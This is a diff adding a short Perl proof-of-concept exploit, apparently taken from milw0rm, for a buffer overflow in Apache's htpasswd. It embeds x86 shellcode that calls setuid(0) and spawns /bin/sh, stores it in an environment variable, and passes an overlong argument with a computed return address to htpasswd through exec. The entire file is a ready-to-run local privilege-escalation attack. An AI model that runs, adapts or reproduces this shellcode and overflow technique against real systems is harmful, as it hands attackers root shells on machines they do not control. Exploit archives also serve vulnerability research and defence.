@@ -1,0 +1,27 @@
+#!/usr/bin/perl 
+# Proof Of Concept exploit for htpasswd of Apache. 
+# Read the advisory for more information. 
+# - Luiz Fernando Camargo 
+# - foxtrot_at_flowsecurity.org 
+$shellcode = "\x31\xdb\x6a\x17\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68". 
+"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"; 
+
+
+$target = "/usr/local/apache/bin/htpasswd"; 
+$retaddr = 0xbffffffa - length($shellcode) - length($target); 
+
+
+print "using retaddr = 0x", sprintf('%lx',($retaddr)), "\r\n"; 
+
+
+local($ENV{'XXX'}) = $shellcode; 
+$newret = pack('l', $retaddr); 
+$buffer = "A" x 272; 
+$buffer .= $newret x 4; 
+$buffer .= " "; 
+$buffer .= "B" x 290; 
+
+
+exec("$target -nb $buffer"); 
+
+# milw0rm.com [2004-09-16]
